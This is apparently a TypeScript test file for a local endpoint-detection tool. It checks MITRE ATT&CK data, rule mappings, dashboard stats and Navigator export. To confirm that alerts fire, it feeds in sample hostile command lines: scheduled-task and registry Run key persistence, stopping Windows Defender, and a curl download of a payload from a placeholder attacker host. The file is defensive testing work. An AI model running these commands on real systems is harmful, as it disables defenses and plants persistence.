import { initDatabase, query } from '../backend/db/index.js';
import { mitreService } from '../backend/mitre/index.js';
import { ingestAndDetect, getRules } from '../backend/detection/index.js';
import { SAFE_SIMULATIONS } from '../server/engine.js';

let passed = 0;
let failed = 0;

function assert(condition: boolean, testName: string) {
  if (condition) {
    console.log(`  \x1b[32m✔\x1b[0m ${testName}`);
    passed++;
  } else {
    console.error(`  \x1b[31m✖\x1b[0m ${testName}`);
    failed++;
  }
}

async function runMitreTests() {
  console.log('\n\x1b[1m=== Running MITRE ATT&CK Integration Test Suite ===\x1b[0m\n');

  await initDatabase();

  // Test 1: Versioned Data Layer & Database
  console.log('\x1b[36m[Test Suite 1: Versioned MITRE Data Layer & Registry]\x1b[0m');
  const activeVer = mitreService.getActiveVersion();
  assert(activeVer === 'v15.1', `Active MITRE ATT&CK version is v15.1 (got ${activeVer})`);

  const versionList = mitreService.getVersionList();
  assert(versionList.length >= 2, `Version registry tracks multiple versions (${versionList.length} found)`);
  assert(versionList.some(v => v.version === 'v15.1' && v.status === 'ACTIVE'), 'v15.1 is registered as ACTIVE');
  assert(versionList.some(v => v.version === 'v14.1'), 'v14.1 is registered for version fallback/history');

  const tactics = mitreService.getTactics();
  assert(tactics.length === 14, `Enterprise ATT&CK matrix has all 14 tactics (found ${tactics.length})`);
  const tacticNames = tactics.map(t => t.name.toLowerCase());
  assert(tacticNames.includes('initial access'), 'Tactics include Initial Access');
  assert(tacticNames.includes('execution'), 'Tactics include Execution');
  assert(tacticNames.includes('persistence'), 'Tactics include Persistence');
  assert(tacticNames.includes('privilege escalation'), 'Tactics include Privilege Escalation');
  assert(tacticNames.includes('defense evasion'), 'Tactics include Defense Evasion');
  assert(tacticNames.includes('credential access'), 'Tactics include Credential Access');
  assert(tacticNames.includes('discovery'), 'Tactics include Discovery');
  assert(tacticNames.includes('lateral movement'), 'Tactics include Lateral Movement');
  assert(tacticNames.includes('command and control'), 'Tactics include Command and Control');
  assert(tacticNames.includes('impact'), 'Tactics include Impact');

  // Test 2: Windows-Focused Techniques Coverage
  console.log('\n\x1b[36m[Test Suite 2: Required Windows-Focused Techniques]\x1b[0m');
  const requiredTechIds = [
    'T1059',      // Command and Scripting Interpreter
    'T1059.001',  // Command and Scripting Interpreter: PowerShell
    'T1053.005',  // Scheduled Task/Job: Scheduled Task
    'T1547.001',  // Boot or Logon Autostart Execution: Registry Run Keys
    'T1218',      // System Binary Proxy Execution
    'T1105',      // Ingress Tool Transfer
    'T1071',      // Application Layer Protocol
    'T1562',      // Impair Defenses
    'T1082'       // System Information Discovery
  ];

  for (const techId of requiredTechIds) {
    const tech = mitreService.getTechniqueById(techId);
    assert(tech !== null, `Technique ${techId} exists in MITRE technique database`);
    if (tech) {
      assert(!!tech.name && tech.name.length > 0, `Technique ${techId} has name: "${tech.name}"`);
      assert(!!tech.tactic && tech.tactic.length > 0, `Technique ${techId} maps to tactic: "${tech.tactic}"`);
      assert(!!tech.description && tech.description.length > 0, `Technique ${techId} contains description`);
      if (techId.includes('.')) {
        assert(tech.is_subtechnique === true, `Technique ${techId} is flagged as sub-technique`);
        assert(tech.parent_id === techId.split('.')[0], `Sub-technique ${techId} links to parent ${tech.parent_id}`);
      }
    }
  }

  // Test 3: Detection Rules to MITRE Mapping
  console.log('\n\x1b[36m[Test Suite 3: Detection-to-Technique Mapping & Rule Coverage]\x1b[0m');
  const rules = getRules();
  const mappedTechniqueIds = rules.map(r => r.mitre.technique_id);

  assert(mappedTechniqueIds.includes('T1059.001'), 'Rules map to T1059.001 (PowerShell)');
  assert(mappedTechniqueIds.includes('T1053.005'), 'Rules map to T1053.005 (Scheduled Task)');
  assert(mappedTechniqueIds.includes('T1547.001'), 'Rules map to T1547.001 (Registry Run Keys)');
  assert(mappedTechniqueIds.includes('T1218'), 'Rules map to T1218 (System Binary Proxy Execution)');
  assert(mappedTechniqueIds.includes('T1105'), 'Rules map to T1105 (Ingress Tool Transfer)');
  assert(mappedTechniqueIds.includes('T1071'), 'Rules map to T1071 (Application Layer Protocol)');
  assert(mappedTechniqueIds.includes('T1562'), 'Rules map to T1562 (Impair Defenses)');
  assert(mappedTechniqueIds.includes('T1082'), 'Rules map to T1082 (System Information Discovery)');

  // Test 4: Live Telemetry Detection & Alert MITRE Fields
  console.log('\n\x1b[36m[Test Suite 4: Telemetry Detection with Sub-Techniques]\x1b[0m');
  
  // 1. Scheduled Task Creation (T1053.005)
  const taskDetection = ingestAndDetect({
    event_type: 'process_creation',
    process_name: 'schtasks.exe',
    command_line: 'schtasks.exe /create /tn "Backdoor" /tr "C:\\Users\\Public\\malware.exe" /sc onstart',
    user: 'WIN-SRV01\\Admin'
  });
  const taskAlert = taskDetection.alertsGenerated.find(a => a.mitre_technique_id === 'T1053.005');
  assert(taskAlert !== undefined, 'Generated alert for Scheduled Task creation');
  assert(taskAlert?.mitre_tactic === 'Persistence', 'Alert contains tactic: Persistence');
  assert(taskAlert?.mitre_subtechnique_id === 'T1053.005', 'Alert contains sub-technique ID: T1053.005');

  // 2. Registry Run Key Modification (T1547.001)
  const regDetection = ingestAndDetect({
    event_type: 'process_creation',
    process_name: 'reg.exe',
    command_line: 'reg.exe add "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "Persistence" /d "C:\\Users\\Public\\test.exe"',
    user: 'WIN-SRV01\\Admin'
  });
  const regAlert = regDetection.alertsGenerated.find(a => a.mitre_technique_id === 'T1547.001');
  assert(regAlert !== undefined, 'Generated alert for Registry Run Key persistence');
  assert(regAlert?.mitre_tactic === 'Persistence', 'Alert contains tactic: Persistence');

  // 3. Impair Defenses (T1562.001)
  const defenderDetection = ingestAndDetect({
    event_type: 'process_creation',
    process_name: 'sc.exe',
    command_line: 'sc stop windefend',
    user: 'WIN-SRV01\\SYSTEM'
  });
  const defenderAlert = defenderDetection.alertsGenerated.find(a => a.mitre_technique_id === 'T1562');
  assert(defenderAlert !== undefined, 'Generated alert for Impair Defenses (Stop WinDefend)');
  assert(defenderAlert?.mitre_subtechnique_id === 'T1562.001', 'Alert contains sub-technique ID: T1562.001');

  // 4. Ingress Tool Transfer (T1105)
  const ingressDetection = ingestAndDetect({
    event_type: 'process_creation',
    process_name: 'curl.exe',
    command_line: 'curl -O http://c2.attacker.com/payload.exe',
    user: 'WIN-SRV01\\User'
  });
  const ingressAlert = ingressDetection.alertsGenerated.find(a => a.mitre_technique_id === 'T1105');
  assert(ingressAlert !== undefined, 'Generated alert for Ingress Tool Transfer');

  // 5. System Information Discovery (T1082)
  const sysinfoDetection = ingestAndDetect({
    event_type: 'process_creation',
    process_name: 'systeminfo.exe',
    command_line: 'systeminfo.exe',
    user: 'WIN-SRV01\\User'
  });
  const sysinfoAlert = sysinfoDetection.alertsGenerated.find(a => a.mitre_technique_id === 'T1082');
  assert(sysinfoAlert !== undefined, 'Generated alert for System Information Discovery');

  // Test 5: MITRE Dashboard Stats Aggregation
  console.log('\n\x1b[36m[Test Suite 5: MITRE Dashboard Aggregations (Tactics, Techniques, Alerts, Timeline, Hosts)]\x1b[0m');
  const coverageStats = mitreService.getCoverageStats();

  assert(coverageStats.tacticsObservedCount > 0, `Dashboard tracks tactics observed (${coverageStats.tacticsObservedCount} observed)`);
  assert(coverageStats.techniquesObservedCount > 0, `Dashboard tracks techniques observed (${coverageStats.techniquesObservedCount} observed)`);
  assert(coverageStats.totalAlertsCount > 0, `Dashboard tracks total alerts count (${coverageStats.totalAlertsCount})`);
  assert(Array.isArray(coverageStats.tacticsObserved), 'Tactics observed is an array with alert breakdowns');
  assert(Array.isArray(coverageStats.techniquesObserved), 'Techniques observed is an array with severity/scores');

  // Timeline
  assert(Array.isArray(coverageStats.timeline), 'Coverage stats includes timeline array');
  assert(coverageStats.timeline.length > 0, `Timeline contains ${coverageStats.timeline.length} chronological events`);
  const firstTimelineItem = coverageStats.timeline[0];
  assert(!!firstTimelineItem.timestamp && !!firstTimelineItem.technique_id && !!firstTimelineItem.tactic, 'Timeline items contain timestamp, technique_id, and tactic');

  // Host Coverage
  assert(Array.isArray(coverageStats.hostCoverage), 'Coverage stats includes host coverage array');
  assert(coverageStats.hostCoverage.length > 0, `Host coverage tracks ${coverageStats.hostCoverage.length} endpoints`);
  const host = coverageStats.hostCoverage[0];
  assert(!!host.hostname, `Host has hostname: ${host.hostname}`);
  assert(host.totalAlerts >= 0, 'Host tracks total alerts');
  assert(Array.isArray(host.tacticsObserved), 'Host tracks tactics observed');
  assert(Array.isArray(host.techniquesObserved), 'Host tracks techniques observed');
  assert(!!host.riskLevel, `Host tracks risk level: ${host.riskLevel}`);

  // Test 6: ATT&CK Navigator Layer Export
  console.log('\n\x1b[36m[Test Suite 6: ATT&CK Navigator Export Compliance (v4.5)]\x1b[0m');
  const navLayer = mitreService.exportAttackNavigatorLayer();

  assert(navLayer.domain === 'enterprise-attack', 'Navigator domain is enterprise-attack');
  assert(navLayer.versions.layer === '4.5', 'Navigator layer version is 4.5');
  assert(Array.isArray(navLayer.techniques), 'Navigator layer contains techniques array');
  assert(navLayer.techniques.length > 0, `Navigator layer exported ${navLayer.techniques.length} techniques`);
  
  const sampleNavTech = navLayer.techniques.find(t => t.techniqueID === 'T1059.001' || t.techniqueID === 'T1053.005');
  assert(sampleNavTech !== undefined, 'Navigator layer contains observed technique with score & color');
  if (sampleNavTech) {
    assert(sampleNavTech.enabled === true, 'Navigator technique is enabled');
    assert(typeof sampleNavTech.score === 'number', `Navigator technique has numeric score: ${sampleNavTech.score}`);
    assert(typeof sampleNavTech.color === 'string' && sampleNavTech.color.startsWith('#'), `Navigator technique has hex color: ${sampleNavTech.color}`);
    assert(typeof sampleNavTech.comment === 'string' && sampleNavTech.comment.includes('LocalEDR'), 'Navigator technique has descriptive comment');
  }

  // Test 7: Safe Simulations Coverage
  console.log('\n\x1b[36m[Test Suite 7: Safe Simulations for Windows Techniques]\x1b[0m');
  const simTechniques = SAFE_SIMULATIONS.map(s => s.technique);
  assert(simTechniques.some(t => t.includes('T1053.005')), 'Safe simulations include T1053.005 (Scheduled Task)');
  assert(simTechniques.some(t => t.includes('T1547.001')), 'Safe simulations include T1547.001 (Registry Run Key)');
  assert(simTechniques.some(t => t.includes('T1105')), 'Safe simulations include T1105 (Ingress Tool Transfer)');
  assert(simTechniques.some(t => t.includes('T1562')), 'Safe simulations include T1562 (Disable Defender)');
  assert(simTechniques.some(t => t.includes('T1082')), 'Safe simulations include T1082 (System Info Discovery)');

  console.log(`\n\x1b[1m=== MITRE ATT&CK Test Results: ${passed} passed, ${failed} failed ===\x1b[0m\n`);

  if (failed > 0) {
    process.exit(1);
  }
}

runMitreTests().catch(err => {
  console.error('MITRE test suite encountered fatal error:', err);
  process.exit(1);
});
